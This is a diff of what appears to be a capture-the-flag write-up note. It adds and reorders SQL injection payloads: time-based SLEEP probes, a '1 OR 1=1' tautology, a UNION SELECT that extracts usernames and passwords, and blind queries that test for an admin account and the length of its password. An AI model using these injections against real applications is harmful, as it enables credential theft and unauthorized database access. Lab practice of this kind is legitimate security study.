@@ -158,19 +158,28 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g
 
 ![[Pasted image 20251204174836.png]]
 
+```sql
+1 OR SLEEP(5)
 ```
-UNION SELECT username,password FROM users--
+
+```sql
+1 OR 1=1--
+```
+
+![[Pasted image 20251204175630.png]]
+
+```sql
+1 UNION SELECT username,password FROM users--
 ```
 
 ![[Pasted image 20251204175325.png]]
 
-```
-1 OR SLEEP(5)
-```
 
-```
+```sql
 1 OR IF((SELECT COUNT(*) FROM user WHERE username='admin')>0, SLEEP(0.2), 0)
 ```
 
-
+```sql
+1 OR IF((SELECT LENGTH(password) FROM user WHERE username='admin')=32, SLEEP(0.2), 0)
+```
 
